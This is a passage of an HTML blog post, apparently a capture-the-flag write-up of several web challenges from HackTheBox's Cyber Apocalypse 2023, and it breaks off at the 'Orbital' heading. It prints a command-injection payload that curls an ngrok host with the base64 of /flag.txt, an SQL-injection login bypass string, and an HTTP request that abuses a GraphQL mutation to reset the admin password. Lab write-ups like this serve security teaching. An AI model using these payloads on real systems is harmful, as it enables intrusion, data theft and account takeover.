<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Cyber Apocalypse 2023 - HackTheBox" />
<meta property="og:locale" content="en" />
<meta name="description" content="Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition." />
<meta property="og:description" content="Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition." />
<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-23T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Cyber Apocalypse 2023 - HackTheBox" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.","@type":"BlogPosting","url":"https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html","headline":"Cyber Apocalypse 2023 - HackTheBox","dateModified":"2023-03-23T00:00:00+01:00","datePublished":"2023-03-23T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>Cyber Apocalypse 2023 - HackTheBox | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my infosec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>Cyber Apocalypse 2023 - HackTheBox</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>Cyber Apocalypse 2023 - HackTheBox</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2023-03-23 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Thu, Mar 23, 2023, 12:00 AM +0100">Mar 23</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3338 words">
  <em>18 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>Cyber Apocalypse 2023</strong> is a very nice jeopardy-style CTF competition hosted by <em>HackTheBox</em>. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.</p>

<p><br /></p>

<h3 id="web">Web<a href="#web" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="trapped-source">Trapped Source<a href="#trapped-source" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Challenge has no downloadables. Starting the container and going to homepage showed a lock;</p>

<p><img data-src="/assets/img/20230323061832.png" alt="" data-proofer-ignore></p>

<p>Checking the page source showed the correct PIN;</p>

<p><img data-src="/assets/img/20230323061930.png" alt="" data-proofer-ignore></p>

<p>Entering it revealed the flag;</p>

<p><img data-src="/assets/img/20230323062019.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="gunhead">Gunhead<a href="#gunhead" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has some sort of console for running commands;</p>

<p><img data-src="/assets/img/20230323062644.png" alt="" data-proofer-ignore></p>

<p>The output of the <code class="language-plaintext highlighter-rouge">/ping</code> command looks very similar to that generated by the <code class="language-plaintext highlighter-rouge">ping</code> utility. Checking <em>burp</em> showed the request was made to <code class="language-plaintext highlighter-rouge">/api/ping</code>;</p>

<p><img data-src="/assets/img/20230323062829.png" alt="" data-proofer-ignore></p>

<p>Going through the downloaded source files, the code that handles the request was found in <code class="language-plaintext highlighter-rouge">models/ReconModel.php</code>;</p>

<p><img data-src="/assets/img/20230323063045.png" alt="" data-proofer-ignore></p>

<p>This is clearly vulnerable to shell command injection. The <code class="language-plaintext highlighter-rouge">Dockerfile</code> showed that the flag is saved locally as <code class="language-plaintext highlighter-rouge">/flag.txt</code>, which I was able to read using <code class="language-plaintext highlighter-rouge">curl</code> to make a request to my server with the file contents;</p>

<div class="language-json highlighter-rouge"><div class="code-header"><span label-text="JSON"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"ip"</span><span class="p">:</span><span class="s2">"`curl http://0cbd-102-91-4-18.ngrok.io/$(cat /flag.txt | base64 -w 0)`"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/20230323063540.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="drobots">DRobots<a href="#drobots" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has a login page;</p>

<p><img data-src="/assets/img/20230323063838.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20230323063947.png" alt="" data-proofer-ignore></p>

<p>Going through the downloaded source, the function that handles login is clearly vulnerable to <em>SQL Injection</em>;</p>

<p><img data-src="/assets/img/20230323064458.png" alt="" data-proofer-ignore></p>

<p>Bypassed auth successfully by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" or 1=1-- -</code>;</p>

<p><img data-src="/assets/img/20230323064550.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="passman">Passman<a href="#passman" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img data-src="/assets/img/20230323064948.png" alt="" data-proofer-ignore></p>

<p>Clicking the <strong>Create</strong> button opened a registration form, and I was able to create an account and login. The app is a password manager;</p>

<p><img data-src="/assets/img/20230323065217.png" alt="" data-proofer-ignore></p>

<p>Burp showed some requests to <code class="language-plaintext highlighter-rouge">/graphql</code> endpoint, which is used for GraphQL queries.</p>

<p>Our login request generated the query;</p>

<div class="language-json highlighter-rouge"><div class="code-header"><span label-text="JSON"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="s2">"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }"</span><span class="p">,</span><span class="nl">"variables"</span><span class="p">:{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"testuser"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>The implementation was found at <code class="language-plaintext highlighter-rouge">helpers/GaphqlHelper.js</code> in the downloaded files;</p>

<p><img data-src="/assets/img/20230323065836.png" alt="" data-proofer-ignore></p>

<p>Just below the above code is another named <code class="language-plaintext highlighter-rouge">UpdatePassword</code> that seems interesting;</p>

<p><img data-src="/assets/img/20230323065906.png" alt="" data-proofer-ignore></p>

<p>Notice how, although there is a check to ensure the user is authenticated, the function is calling <code class="language-plaintext highlighter-rouge">db.updatePassword()</code> with the username and password supplied by the user. <code class="language-plaintext highlighter-rouge">updatePassword()</code> is implemented in <code class="language-plaintext highlighter-rouge">database.js</code> file;</p>

<p><img data-src="/assets/img/20230323070301.png" alt="" data-proofer-ignore></p>

<p>As can be seen above, the application is using user-defined username to update password, which means we could reset the password of another user. Note that the <code class="language-plaintext highlighter-rouge">entrypoint.sh</code> file showed that a user named <em>admin</em> exists.</p>

<p>There is no option in the web UI for changing user password. So I tried updating the request used for <code class="language-plaintext highlighter-rouge">LoginUser</code> as it has similar structure with <code class="language-plaintext highlighter-rouge">UpdatePassword</code> to reset the password of <em>admin</em>, and it worked!</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /graphql HTTP/1.1
Host: 139.59.176.230:30434
Content-Length: 195
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://139.59.176.230:30434
Referer: http://139.59.176.230:30434/dashboard
Accept-Encoding: gzip, deflate
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOjAsImlhdCI6MTY3OTU1MDYxNn0.hHFrRgThAy4kvGO546KjdvNquPXk3NPknaJt_VvB_P4
Connection: close

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"testpass"}}
</pre></td></tr></tbody></table></code></div></div>

<p>I was able to login using <code class="language-plaintext highlighter-rouge">admin:testpass</code>;</p>

<p><img data-src="/assets/img/20230323071013.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="orbital">Orbital<a href="#orbital" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
